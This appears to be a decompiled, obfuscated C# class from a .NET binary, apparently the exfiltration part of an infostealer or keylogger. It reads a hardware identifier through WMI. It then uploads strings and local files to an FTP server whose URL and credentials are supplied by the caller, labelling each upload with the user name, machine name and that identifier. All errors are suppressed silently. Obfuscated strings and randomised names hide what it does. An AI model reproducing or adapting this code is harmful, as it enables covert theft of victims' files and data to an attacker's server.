using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class ATYckHdWsYOYHnae
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string VVqKyWIMql()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107401204));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107401183)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107401198);
			ManagementObject val3 = new ManagementObject(getString_0(107401193) + text2 + getString_0(107400608));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107400603)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389389) : text;
		}
	}

	public static void TeVCZEIzFBgW(string inpAnvxXLKT = "URL", string UdcVjiZHqYBSu = "USERNAME", string vAMfXfJjCh = "ACCESO", string rKMAltxSZITDRIKuw = "")
	{
		try
		{
			string text = VVqKyWIMql();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(inpAnvxXLKT + getString_0(107402820) + Environment.UserName + getString_0(107402775) + Environment.MachineName + getString_0(107402754) + text + getString_0(107402749));
			ftpWebRequest.Method = getString_0(107400578);
			ftpWebRequest.Credentials = new NetworkCredential(UdcVjiZHqYBSu, vAMfXfJjCh);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(rKMAltxSZITDRIKuw);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void GBhprVwnyvota(string JDjiFiwzTlwH = "URL", string YaHHQMVvPyhmyBR = "USERNAME", string DeQVWdelqDIea = "ACCESO", string XvWXTXVDIZzKCPro = "")
	{
		try
		{
			string text = VVqKyWIMql();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(JDjiFiwzTlwH + getString_0(107402820) + Environment.UserName + getString_0(107402775) + Environment.MachineName + getString_0(107402754) + text + getString_0(107402754) + Path.GetFileName(XvWXTXVDIZzKCPro));
			ftpWebRequest.Method = getString_0(107400578);
			ftpWebRequest.Credentials = new NetworkCredential(YaHHQMVvPyhmyBR, DeQVWdelqDIea);
			byte[] array = File.ReadAllBytes(XvWXTXVDIZzKCPro);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static ATYckHdWsYOYHnae()
	{
		Strings.CreateGetStringDelegate(typeof(ATYckHdWsYOYHnae));
	}
}
